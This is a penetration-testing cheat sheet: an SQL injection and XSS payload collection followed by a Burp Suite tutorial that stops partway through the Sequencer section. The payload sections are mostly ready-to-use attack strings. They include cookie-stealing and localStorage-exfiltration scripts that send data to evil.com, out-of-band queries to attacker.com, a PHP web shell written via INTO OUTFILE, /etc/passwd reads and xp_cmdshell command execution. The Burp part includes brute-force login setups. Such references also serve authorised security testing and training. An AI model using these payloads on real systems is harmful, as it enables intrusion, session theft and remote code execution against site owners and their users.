### Boolean-Based Blind

```sql
-- True condition
' AND 1=1--
' AND 'a'='a'--

-- False condition
' AND 1=2--
' AND 'a'='b'--

-- Character extraction
' AND SUBSTRING(username,1,1)='a'--
' AND SUBSTRING((SELECT database()),1,1)='t'--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>100--
```

### Binary Search

```sql
' AND ASCII(SUBSTRING((SELECT database()),1,1))>64--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>96--
' AND ASCII(SUBSTRING((SELECT database()),1,1))>112--
...narrow down to exact character...
```

### Length Detection

```sql
' AND LENGTH(database())>1--
' AND LENGTH(database())>5--
' AND LENGTH(database())=7--
```

### Table/Column Enumeration

```sql
' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5--

' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1),1,1)='u'--
```

---

## 📦 Payloads — ⏱️ Time-Based Injection

### MySQL

```sql
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
' AND BENCHMARK(10000000,SHA1('test'))--

1' AND (SELECT SLEEP(5) FROM dual WHERE database() LIKE 't%')--
```

### PostgreSQL

```sql
'; SELECT pg_sleep(5)--
' AND 1=(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 1 END)--
' || pg_sleep(5)--
```

### MSSQL

```sql
'; WAITFOR DELAY '0:0:5'--
' AND 1=1 WAITFOR DELAY '0:0:5'--
'; IF (1=1) WAITFOR DELAY '0:0:5'--
```

### Oracle

```sql
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)--
```

---

## 📦 Payloads — 🗄️ DBMS Specific

### MySQL Payloads

```sql
-- Version
' UNION SELECT @@version--
' UNION SELECT version()--

-- Current user
' UNION SELECT user()--
' UNION SELECT current_user()--

-- Database
' UNION SELECT database()--

-- Tables
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database()--

-- Columns
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users'--

-- Read file
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- Write file
' UNION SELECT '<?php system($_GET["cmd"]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

### PostgreSQL Payloads

```sql
-- Version
' UNION SELECT version()--

-- Current user
' UNION SELECT current_user--

-- Database
' UNION SELECT current_database()--

-- Tables
' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--

-- Read file
' UNION SELECT pg_read_file('/etc/passwd')--

-- Command execution
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id';--
```

### MSSQL Payloads

```sql
-- Version
' UNION SELECT @@version--

-- Current user
' UNION SELECT SYSTEM_USER--

-- Database
' UNION SELECT DB_NAME()--

-- Tables
' UNION SELECT name FROM sysobjects WHERE xtype='U'--

-- Command execution
'; EXEC xp_cmdshell 'whoami';--

-- Enable xp_cmdshell
'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
```

### Oracle Payloads

```sql
-- Version
' UNION SELECT banner FROM v$version WHERE rownum=1--

-- Current user
' UNION SELECT user FROM dual--

-- Database
' UNION SELECT ora_database_name FROM dual--

-- Tables
' UNION SELECT table_name FROM all_tables--

-- Columns
' UNION SELECT column_name FROM all_tab_columns WHERE table_name='USERS'--
```

---

## 📦 Payloads — 🛡️ WAF Bypass

### Space Bypass

```sql
'/**/OR/**/1=1--
' OR/**/1=1--
'%09OR%091=1--
'%0AOR%0A1=1--
'%0COR%0C1=1--
'%0DOR%0D1=1--
'+OR+1=1--
```

### Comment Bypass

```sql
/*!50000SELECT*/ * FROM users
SELECT/**_**/ * FROM users
SELECT%0a* FROM users
```

### Case Variation

```sql
' uNiOn SeLeCt 1,2,3--
' UnIoN sElEcT 1,2,3--
```

### Encoding

```sql
-- URL encoding
%27%20OR%201=1--
%27%20UNION%20SELECT%201,2,3--

-- Double URL encoding
%2527%20OR%201=1--

-- Hex encoding
' UNION SELECT 0x61646d696e--  (admin in hex)
```

### Keyword Bypass

```sql
-- UNION bypass
' UNION ALL SELECT
' /*!UNION*/ SELECT
' UN/**/ION SE/**/LECT

-- SELECT bypass
' UNION SEL/**/ECT
' UNION%0ASELECT
' UNION(SELECT)

-- AND/OR bypass
' && 1=1--
' || 1=1--
' %26%26 1=1--
' -1 || 1=1--
```

### HPP (HTTP Parameter Pollution)

```
?id=1&id=' OR '1'='1
?id=1/*&id=*/' OR '1'='1
```

---

## 📦 Payloads — 📡 Out-of-Band

### MySQL OOB

```sql
SELECT LOAD_FILE(CONCAT('\\\\',version(),'.attacker.com\\a'))
SELECT * INTO OUTFILE '\\\\attacker.com\\share\\output.txt'
```

### MSSQL OOB

```sql
'; EXEC master..xp_dirtree '\\attacker.com\share'--
'; EXEC master..xp_fileexist '\\attacker.com\share'--
```

### PostgreSQL OOB

```sql
CREATE EXTENSION dblink; SELECT dblink_connect('host=attacker.com user=test password=test dbname=test')
```

### Oracle OOB

```sql
SELECT UTL_HTTP.REQUEST('http://attacker.com/'||version) FROM dual
SELECT HTTPURITYPE('http://attacker.com/'||version).GETCLOB() FROM dual
```

---

## 📦 Payloads — 📊 Quick Reference

### Detection Order

1. `'` - Single quote
2. `"` - Double quote
3. `' OR '1'='1` - Boolean injection
4. `' AND SLEEP(5)--` - Time-based
5. `' UNION SELECT NULL--` - Union-based

### Common Endpoints

```
- Login forms
- Search boxes
- User IDs in URLs
- Cookie values
- HTTP headers (User-Agent, Referer)
- API parameters
```

### SQL Comments by DBMS

| DBMS | Comments |
|------|----------|
| MySQL | `-- `, `#`, `/* */` |
| PostgreSQL | `-- `, `/* */` |
| MSSQL | `-- `, `/* */` |
| Oracle | `-- `, `/* */` |

---

## 📦 Payloads — 📚 Resources

- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)

---

<p align="center">
  <b>💉 SQL Injection Arsenal</b><br>
  <i>For educational purposes only!</i>
</p>

## 📦 Payloads — # 💉 XSS Payloads Collection

```
  ██╗  ██╗███████╗███████╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
   ╚███╔╝ ███████╗███████╗    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
   ██╔██╗ ╚════██║╚════██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ██╔╝ ██╗███████║███████║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## 📦 Payloads — 📋 Table of Contents

- [Basic Payloads](#-basic-payloads)
- [Event Handler Payloads](#-event-handler-payloads)
- [Attribute Injection](#-attribute-injection)
- [JavaScript Context](#-javascript-context)
- [Filter Bypass](#-filter-bypass)
- [WAF Bypass](#-waf-bypass)
- [Polyglot Payloads](#-polyglot-payloads)
- [Blind XSS](#-blind-xss)
- [DOM XSS](#-dom-xss)

---

## 📦 Payloads — 🔴 Basic Payloads

### Classic Script Tags

```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
<script>console.log('XSS')</script>
```

### Self-Closing Tags

```html
<script src="https://evil.com/xss.js"/>
<script src=//evil.com/xss.js></script>
<script/src="https://evil.com/xss.js"></script>
```

### External Script

```html
<script src="https://evil.com/xss.js"></script>
<script src="data:text/javascript,alert(1)"></script>
<script src="data:,alert(1)"></script>
```

---

## 📦 Payloads — ⚡ Event Handler Payloads

### Image Events

```html
<img src=x onerror=alert('XSS')>
<img src=x onerror="alert('XSS')">
<img/src=x onerror=alert('XSS')>
<img src="x" onerror="alert(1)">
<img src=1 onerror=alert(1)>
<img src=/ onerror=alert(1)>
<img src="javascript:alert(1)">
<img onload=alert('XSS') src="valid.jpg">
```

### SVG Events

```html
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>
<svg onload="alert('XSS')">
<svg><script>alert(1)</script></svg>
<svg><script>alert&#40;1&#41;</script></svg>
```

### Body Events

```html
<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>
<body onfocus=alert('XSS')>
<body onhashchange=alert('XSS')>
<body onscroll=alert('XSS')>
```

### Input Events

```html
<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus><input autofocus>
<input type="image" src=x onerror=alert('XSS')>
<input type="text" onfocus="alert('XSS')" autofocus>
```

### Other Event Handlers

```html
<marquee onstart=alert('XSS')>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<iframe onload=alert('XSS')>
<object data=javascript:alert('XSS')>
<embed src=javascript:alert('XSS')>
<a onmouseover=alert('XSS')>click me</a>
<div onmouseover=alert('XSS')>hover me</div>
<form onsubmit=alert('XSS')><input type=submit>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
```

---

## 📦 Payloads — 🔗 Attribute Injection

### Breaking Out of Attributes

```html
"><script>alert('XSS')</script>
"><img src=x onerror=alert('XSS')>
'><script>alert('XSS')</script>
'><img src=x onerror=alert('XSS')>
"><svg onload=alert('XSS')>
" onmouseover="alert('XSS')
' onmouseover='alert(1)'
" onfocus="alert('XSS')" autofocus "
```

### Event in Attributes

```html
" onclick=alert('XSS') "
" onmouseover=alert('XSS') "
" onfocus=alert('XSS') autofocus "
" onload=alert('XSS') "
```

### Style Attribute (Old Browsers)

```html
<div style="background:url(javascript:alert('XSS'))">
<div style="width:expression(alert('XSS'))">
```

---

## 📦 Payloads — 📜 JavaScript Context

### Breaking Out of JavaScript

```javascript
';alert('XSS');//
";alert('XSS');//
</script><script>alert('XSS')</script>
'-alert('XSS')-'
"-alert('XSS')-"
\';alert(1)//
\";alert(1)//
```

### Template Literals

```javascript
${alert('XSS')}
`${alert(1)}`
${alert`XSS`}
```

### Inside JSON

```json
{"name":"test","value":"</script><script>alert(1)</script>"}
```

---

## 📦 Payloads — 🔓 Filter Bypass

### Case Variation

```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<scRIPT>alert('XSS')</scRIPT>
<IMG SRC=x OnErRoR=alert('XSS')>
```

### Tag Breaking

```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<sc\x00ript>alert('XSS')</sc\x00ript>
<scr\x09ipt>alert('XSS')</scr\x09ipt>
```

### Encoding - HTML Entities

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>
```

### URL Encoding

```html
<img src=x onerror=%61%6c%65%72%74%28%31%29>
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>
```

### Unicode Encoding

```html
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
```

### Null Byte Injection

```html
<scr\x00ipt>alert('XSS')</scr\x00ipt>
<img src=x onerror=alert('XSS')\x00>
```

### Whitespace Bypass

```html
<img/src=x/onerror=alert('XSS')>
<img\nsrc=x\nonerror=alert('XSS')>
<img\tsrc=x\tonerror=alert('XSS')>
<img src=x	onerror=alert('XSS')>
```

### Without Parentheses

```html
<script>alert`XSS`</script>
<script>onerror=alert;throw'XSS'</script>
<img src=x onerror=alert`1`>
<img src=x onerror="window['alert'](1)">
```

### Without Quotes

```html
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(/XSS/)>
```

---

## 📦 Payloads — 🛡️ WAF Bypass

### Double Encoding

```html
%253Cscript%253Ealert(1)%253C/script%253E
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
```

### Using Comments

```html
<script>/**/alert('XSS')/**/</script>
<img src=x onerror=/**/alert(1)/**//>
<!--<script>-->alert(1)<!--</script>-->
```

### Line Breaks

```html
<script>
alert('XSS')
</script>

<img src=x
onerror
=
alert(1)>
```

### Alternative Tags

```html
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<math><maction xlink:href="javascript:alert(1)">click
<isindex action="javascript:alert(1)" type=submit value=click>
```

### SVG-based Bypass

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x dur=1s>
<svg/onload=alert(1)>
```

### Using `eval`

```html
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

### Using `setTimeout`/`setInterval`

```html
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',0)</script>
<img src=x onerror=setTimeout('alert(1)')>
```

### Using `fetch`

```html
<script>fetch('https://evil.com/'+document.cookie)</script>
```

---

## 📦 Payloads — 🎭 Polyglot Payloads

### Universal XSS Polyglots

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23telecomhallx27telecomhall;)>'">

"><img src=x onerror=alert(1)//>'\"><img src=x onerror=alert(1)//><img src=x onerror=alert(1)//>'\"

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### Short Polyglot

```html
'"><script>alert(1)</script>
'"><img src=x onerror=alert(1)>
```

---

## 📦 Payloads — 👁️ Blind XSS

### Cookie Stealer

```html
<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>
<script>fetch('https://evil.com/'+document.cookie)</script>
<img src=x onerror="this.src='https://evil.com/?c='+document.cookie">
```

### Data Exfiltration

```html
<script>
var i=new Image();
i.src="https://evil.com/?cookie="+document.cookie+"&url="+document.URL;
</script>

<script>
fetch('https://evil.com/collect',{
    method:'POST',
    body:JSON.stringify({
        cookie:document.cookie,
        url:location.href,
        localStorage:JSON.stringify(localStorage)
    })
})
</script>
```

### XSS Hunter Payloads

```html
"><script src=https://xss.ht></script>
"><img src=x onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8veHNzLmh0Lz9jPScrZG9jdW1lbnQuY29va2ll'))">
```

### Blind XSS for Forms

```html
"><script src="https://your.xss.ht"></script>
test@test.com"><script src="https://your.xss.ht"></script>
{{constructor.constructor('fetch("https://your.xss.ht?c="+document.cookie)')()}}
```

---

## 📦 Payloads — 🌐 DOM XSS

### Source-based DOM XSS

```javascript
// URL fragment
https://example.com#<script>alert(1)</script>

// URL parameter
https://example.com?name=<script>alert(1)</script>

// document.referrer
Referer: <script>alert(1)</script>
```

### Common Sinks

```javascript
// innerHTML
document.getElementById('x').innerHTML = userInput;
// Payload: <img src=x onerror=alert(1)>

// document.write
document.write(userInput);
// Payload: <script>alert(1)</script>

// eval
eval(userInput);
// Payload: alert(1)

// location
location = userInput;
location.href = userInput;
// Payload: javascript:alert(1)
```

### jQuery Sinks

```javascript
// $().html()
$('#x').html(userInput);
// Payload: <img src=x onerror=alert(1)>

// $()
$(userInput);
// Payload: <img src=x onerror=alert(1)>

// $.parseHTML()
$.parseHTML(userInput);
// Payload: <img src=x onerror=alert(1)>
```

### Angular Payloads

```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

---

## 📦 Payloads — 📊 Quick Reference by Context

### HTML Context
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Attribute Context
```html
" onmouseover="alert(1)
"><script>alert(1)</script>
' onfocus='alert(1)' autofocus='
```

### JavaScript String Context
```javascript
';alert(1)//
"-alert(1)-"
</script><script>alert(1)</script>
```

### URL Context
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

## 📦 Payloads — 📚 Resources

- [PortSwigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

<p align="center">
  <b>💉 XSS Payload Arsenal</b><br>
  <i>For educational purposes only!</i>
</p>

## 🕸 Burp Suite — # 🔶 Burp Suite - Complete Cheatsheet

```
    ____                      _____       _ __     
   / __ )__  ___________     / ___/__  __(_) /____
  / __  / / / / ___/ __ \    \__ \/ / / / / __/ _ \
 / /_/ / /_/ / /  / /_/ /   ___/ / /_/ / / /_/  __/
/_____/\__,_/_/  / .___/   /____/\__,_/_/\__/\___/ 
                /_/                                
    Web Application Security Testing Platform
```

<p align="center">
  <img src="https://img.shields.io/badge/Burp-Suite-orange?style=for-the-badge" alt="Burp Suite">
  <img src="https://img.shields.io/badge/Web-Security-red?style=for-the-badge" alt="Web Security">
  <img src="https://img.shields.io/badge/PortSwigger-blue?style=for-the-badge" alt="PortSwigger">
  <img src="https://img.shields.io/badge/Penetration-Testing-purple?style=for-the-badge" alt="Penetration Testing">
</p>

<p align="center">
  <b>🌐 The industry-standard web application security testing platform</b>
</p>

---

## 🕸 Burp Suite — 📋 Table of Contents

- [Introduction](#-introduction)
- [Installation & Setup](#-installation--setup)
- [Proxy Configuration](#-proxy-configuration)
- [Intercepting Traffic](#-intercepting-traffic)
- [Target & Scope](#-target--scope)
- [Spider/Crawler](#-spidercrawler)
- [Scanner](#-scanner)
- [Repeater](#-repeater)
- [Intruder](#-intruder)
- [Decoder](#-decoder)
- [Comparer](#-comparer)
- [Sequencer](#-sequencer)
- [Extensions](#-extensions)
- [Keyboard Shortcuts](#-keyboard-shortcuts)
- [Testing Workflow](#-testing-workflow)
- [Quick Reference](#-quick-reference)
- [Tips & Best Practices](#-tips--best-practices)
- [Resources](#-resources)

---

## 🕸 Burp Suite — 📥 Installation & Setup

### Download

```bash
# Download from official site
https://portswigger.net/burp/releases

# Available for:
# - Windows (installer/standalone)
# - macOS (DMG)
# - Linux (script/JAR)
```

### System Requirements

| Requirement | Minimum | Recommended |
|-------------|---------|-------------|
| RAM | 4 GB | 8+ GB |
| Disk | 500 MB | 2+ GB |
| Java | JRE 8+ | Bundled JRE |
| Display | 1280x800 | 1920x1080 |

### First Launch Configuration

1. **Select Project Type**
   - Temporary project (testing)
   - New project on disk (save work)
   - Open existing project

2. **Configuration**
   - Use Burp defaults (recommended for beginners)
   - Load from configuration file

3. **Memory Allocation**
   ```bash
   # Increase memory for large projects
   java -jar -Xmx4g burpsuite_pro.jar
   ```

---

## 🕸 Burp Suite — 🔌 Proxy Configuration

### Browser Configuration

#### Manual Proxy Setup

| Browser | Proxy Settings Location |
|---------|------------------------|
| Firefox | Settings → Network → Manual proxy |
| Chrome | Uses system proxy or extension |
| Safari | System Preferences → Network → Proxies |

**Default Burp Proxy:**
```
Host: 127.0.0.1
Port: 8080
```

#### Firefox Configuration
```
1. Open Firefox Preferences
2. Search for "proxy"
3. Click "Settings..."
4. Select "Manual proxy configuration"
5. HTTP Proxy: 127.0.0.1  Port: 8080
6. Check "Also use this proxy for HTTPS"
7. Click OK
```

#### FoxyProxy Extension (Recommended)
```
1. Install FoxyProxy extension
2. Add new proxy:
   - Title: Burp Suite
   - Proxy Type: HTTP
   - Proxy IP: 127.0.0.1
   - Port: 8080
3. Enable when testing
```

### SSL/TLS Certificate Installation

```bash
# Step 1: With proxy enabled, visit:
http://burp

# Step 2: Click "CA Certificate" to download

# Step 3: Import certificate:
# Firefox: Settings → Certificates → Import → Trust for websites
# Chrome: Settings → Security → Manage certificates → Import
# System: Add to trusted root certificates
```

### Proxy Listeners

```
Proxy → Options → Proxy Listeners

Default: 127.0.0.1:8080

Add custom listeners:
- Different ports for different testing
- Bind to all interfaces (0.0.0.0) for mobile testing
- Redirect to different hosts
```

### Invisible Proxy (For Non-Proxy-Aware Clients)

```
1. Proxy → Options → Proxy Listeners
2. Edit listener → Request handling
3. Enable "Support invisible proxying"
4. Configure hosts file or DNS
```

---

## 🕸 Burp Suite — 🎣 Intercepting Traffic

### Intercept Controls

| Button | Function |
|--------|----------|
| **Intercept is on/off** | Toggle interception |
| **Forward** | Send request to server |
| **Drop** | Discard request |
| **Action** | Additional options menu |

### Intercept Options

```
Proxy → Options → Intercept Client Requests

Rules examples:
- Only intercept in-scope items
- Only intercept specific file types
- Exclude images and static files
```

### Request Modification

```http
# Original Request
GET /page.php?id=1 HTTP/1.1
Host: target.com

# Modified Request (while intercepted)
GET /page.php?id=1' OR '1'='1 HTTP/1.1
Host: target.com
```

### Match and Replace

```
Proxy → Options → Match and Replace

Common rules:
- Remove security headers
- Modify User-Agent
- Add custom headers
- Replace request parameters
```

| Type | Match | Replace | Purpose |
|------|-------|---------|---------|
| Request header | `User-Agent: .*` | `User-Agent: Custom` | Change UA |
| Request body | `password=test` | `password=admin` | Test creds |
| Response header | `X-Frame-Options.*` | ` ` | Remove header |
| Response body | `disabled` | `enabled` | Enable buttons |

### Response Modification

```
Proxy → Options → Intercept Server Responses

Enable for:
- Remove security headers
- Modify JavaScript
- Change response content
- Test client-side controls
```

---

## 🕸 Burp Suite — 🎯 Target & Scope

### Adding to Scope

```
Method 1: Right-click in Site map → Add to scope
Method 2: Target → Scope → Add (manually)
Method 3: From Proxy history → Add to scope
```

### Scope Configuration

```
Target → Scope

Include in scope:
- Protocol: Any/HTTP/HTTPS
- Host/IP: target.com
- Port: Any/Specific
- File: Regex pattern

Example patterns:
.*\.target\.com$          # All subdomains
^https://target\.com/app  # Specific path
```

### Advanced Scope Settings

```
Target → Scope → Advanced scope control

Include:
  Protocol: HTTPS
  Host: target.com
  Port: 443
  File: ^/api/.*

Exclude:
  Host: .*\.google\.com
  File: .*\.(jpg|png|gif|css|js)$
```

### Site Map

```
Target → Site map

Features:
- View all discovered content
- Filter by scope
- Search/filter content
- Highlight interesting items
- Compare site maps
```

---

## 🕸 Burp Suite — 🕷️ Spider/Crawler

### Starting the Spider

```
1. Right-click target in Site map
2. Select "Spider this host" or "Spider this branch"
3. Or: Target → Site map → Right-click → Scan → Crawl
```

### Spider Settings

```
Spider → Options (legacy) OR
Dashboard → New scan → Crawl

Crawler settings:
- Maximum link depth
- Maximum crawl time
- Forms submission
- Login handling
```

### Crawl Configuration

| Setting | Description | Recommended |
|---------|-------------|-------------|
| **Link depth** | How deep to follow links | 5-10 |
| **Max requests** | Total requests limit | 1000-5000 |
| **Duplicate removal** | Skip similar pages | Enabled |
| **Passive scanning** | Scan while crawling | Enabled |

### Form Submission

```
Spider → Options → Application Login

Configure login for:
- Single credentials
- Credential list
- Session detection
```

---

## 🕸 Burp Suite — 🔍 Scanner

### Scan Types

| Type | Description | Use Case |
|------|-------------|----------|
| **Passive** | Analyze proxy traffic | Always on |
| **Active** | Send payloads to find vulns | With permission |
| **Full** | Comprehensive scan | Time available |
| **Custom** | Specific tests only | Targeted testing |

### Starting a Scan

```
Method 1: Right-click → Scan
Method 2: Dashboard → New scan
Method 3: Send to Scanner from other tools
```

### Scan Configuration

```
Dashboard → New scan → Scan configuration

Built-in configurations:
- Audit checks - all except JavaScript analysis
- Audit checks - critical issues only
- Audit checks - light, active
- Audit checks - medium, active
- Audit checks - full, active
```

### Vulnerability Categories

```
Scanner checks for:

Injection:
- SQL Injection
- OS Command Injection
- LDAP Injection
- XML/XPath Injection

Cross-Site Scripting:
- Reflected XSS
- Stored XSS
- DOM-based XSS

Authentication:
- Broken authentication
- Session management issues
- Weak passwords

Other:
- CSRF
- Directory traversal
- File inclusion
- Information disclosure
- Server-side issues
```

### Scan Results

```
Dashboard → Issue activity
Target → Site map → Issues

For each issue:
- Severity (High/Medium/Low/Info)
- Confidence (Certain/Firm/Tentative)
- Description
- Remediation
- Evidence (request/response)
```

### Custom Scan Profiles

```
1. Dashboard → New scan
2. Select "Scan configuration"
3. Click "New" or modify existing
4. Save for reuse

Customize:
- Which vulnerabilities to test
- Payload intensity
- Request rate
- Authentication handling
```

---

## 🕸 Burp Suite — 🔁 Repeater

### Purpose

Manual testing and manipulation of individual requests.

### Sending to Repeater

```
1. Right-click any request
2. Select "Send to Repeater"
3. Keyboard: Ctrl+R
```

### Using Repeater

```
1. Modify request in left panel
2. Click "Send" (or Ctrl+Space)
3. View response in right panel
4. Compare responses
```

### Repeater Features

| Feature | Description |
|---------|-------------|
| **Multiple tabs** | Test multiple requests |
| **Request history** | Navigate with < > buttons |
| **Follow redirects** | Toggle auto-follow |
| **Process cookies** | Update cookies automatically |
| **Content-Length** | Auto-update header |

### Testing Examples

```http
# Test for SQL Injection
GET /user.php?id=1' HTTP/1.1

# Test for XSS
GET /search?q=<script>alert(1)</script> HTTP/1.1

# Test authentication bypass
GET /admin HTTP/1.1
Cookie: role=admin

# Test IDOR
GET /api/user/1 HTTP/1.1  # Your user
GET /api/user/2 HTTP/1.1  # Other user
```

---

## 🕸 Burp Suite — 🔫 Intruder

### Attack Types

| Type | Positions | Payloads | Use Case |
|------|-----------|----------|----------|
| **Sniper** | 1+ | 1 set, one at a time | Single parameter testing |
| **Battering Ram** | 1+ | 1 set, same everywhere | Same value everywhere |
| **Pitchfork** | 1+ | Multiple sets, parallel | Username + password pairs |
| **Cluster Bomb** | 1+ | Multiple sets, all combinations | Full credential bruteforce |

### Sending to Intruder

```
1. Right-click request
2. Select "Send to Intruder"
3. Keyboard: Ctrl+I
```

### Setting Positions

```
Intruder → Positions

Mark injection points with § symbols:

GET /login.php?user=§admin§&pass=§test§ HTTP/1.1

Buttons:
- Add § - Mark selection
- Clear § - Remove markers
- Auto § - Auto-detect
```

### Payload Types

| Type | Description |
|------|-------------|
| **Simple list** | Custom wordlist |
| **Runtime file** | Load from file |
| **Numbers** | Sequential/random numbers |
| **Dates** | Date sequences |
| **Brute forcer** | Character combinations |
| **Null payloads** | Empty payloads (rate testing) |
| **Username generator** | Common username patterns |

### Payload Processing

```
Intruder → Payloads → Payload Processing

Add rules:
- Add prefix/suffix
- URL encode
- Base64 encode
- Hash (MD5, SHA)
- Match/replace
```

### Grep - Match

```
Intruder → Options → Grep - Match

Add strings to flag in responses:
- "Login successful"
- "Invalid password"
- "error"
- Custom regex

Helps identify successful attacks.
```

### Attack Examples

#### Brute Force Login
```
POST /login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=§admin§&password=§password§

Attack type: Cluster bomb
Payload 1: Username list
Payload 2: Password list
```

#### Fuzzing Parameters
```
GET /api/user/§1§ HTTP/1.1

Attack type: Sniper
Payload: Numbers 1-1000
```

#### Content Discovery
```
GET /§admin§ HTTP/1.1

Attack type: Sniper
Payload: Directory wordlist
Filter: Status code != 404
```

### Results Analysis

```
After attack:
- Sort by length (find different responses)
- Sort by status code
- Filter by grep match
- Export results
```

---

## 🕸 Burp Suite — 🔓 Decoder

### Encoding/Decoding

```
Decoder tab

Operations:
- URL encode/decode
- HTML encode/decode
- Base64 encode/decode
- Hex encode/decode
- Gzip compress/decompress
- ASCII Hex
- Binary
```

### Smart Decode

```
Decoder → Smart decode

Automatically detects and decodes:
- Base64
- URL encoding
- HTML entities
- Combined encodings
```

### Common Uses

```
# Decode JWT token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
→ Decode as Base64

# Decode URL parameter
%3Cscript%3Ealert(1)%3C%2Fscript%3E
→ URL decode
→ <script>alert(1)</script>

# Encode payload
<script>alert(1)</script>
→ Base64 encode
→ Use in attack
```

---

## 🕸 Burp Suite — 📊 Comparer

### Purpose

Compare two data items (requests, responses, or any data).

### How to Use

```
1. Right-click item 1 → Send to Comparer
2. Right-click item 2 → Send to Comparer
3. Go to Comparer tab
4. Select items and click "Words" or "Bytes"
```

### Comparison Modes

| Mode | Description |
|------|-------------|
| **Words** | Compare word by word |
| **Bytes** | Compare byte by byte (exact) |

### Use Cases

```
- Compare successful vs failed login responses
- Find differences in session tokens
- Compare before/after modifications
- Identify hidden form fields
```

---

## 🕸 Burp Suite — 🔢 Sequencer

### Purpose

Analyze the quality of randomness in tokens (session IDs, CSRF tokens).

### How to Use

```
1. Capture request that returns token
2. Right-click → Send to Sequencer
3. Configure token location
4. Start live capture
5. Analyze results
```

### Analysis Metrics

| Metric | Good Value | Description |
|--------|------------|-------------|
| **Overall quality** | >100 bits | Randomness score |
| **Character-level** | High entropy | Per-character randomness |
| **Bit-level** | High entropy | Per-bit randomness |

### Interpretation

```
Results:
- Excellent: Token is cryptographically random
- Good: Acceptable for most uses  
- Poor: Potentially predictable
